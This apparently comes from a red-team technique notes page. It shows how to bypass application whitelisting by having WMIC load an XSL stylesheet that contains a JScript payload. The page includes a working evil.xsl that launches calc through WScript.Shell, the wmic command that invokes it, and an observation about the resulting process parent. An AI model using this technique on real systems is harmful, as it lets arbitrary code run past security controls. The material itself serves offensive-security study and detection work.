# Application Whitelisting Bypass with WMIC and XSL

Another application whitelist bypassing technique discovered by Casey @subTee, similar to squiblydoo:

[regsvr32.md](regsvr32.md "mention")

### Execution

Define the XSL file containing the jscript payload:

{% code title="evil.xsl" %}
```csharp
<?xml version='1.0'?>
<stylesheet
xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt"
xmlns:user="placeholder"
version="1.0">
<output method="text"/>
	<ms:script implements-prefix="user" language="JScript">
	<![CDATA[
	var r = new ActiveXObject("WScript.Shell").Run("calc");
	]]> </ms:script>
</stylesheet>
```
{% endcode %}

Invoke any wmic command now and specify /format pointing to the evil.xsl:

{% code title="attacker\@victim" %}
```csharp
wmic os get /FORMAT:"evil.xsl"
```
{% endcode %}

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-Lc80Wz7oFTLicKpgqdv%2F-Lc83UYBZZHhXT_-Wmf4%2FScreenshot%20from%202019-04-10%2022-05-24.png?alt=media\&token=feb9b0f5-f1ad-43c2-9b69-a5eb5edf0b1b)

### Observation

Calculator is spawned by svchost.exe:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-Lc80Wz7oFTLicKpgqdv%2F-Lc81mqIr4hmt8oEtfl-%2FScreenshot%20from%202019-04-10%2021-57-52.png?alt=media\&token=1c454d5e-f72d-4cc3-8d42-75e0c2e7218a)

### References
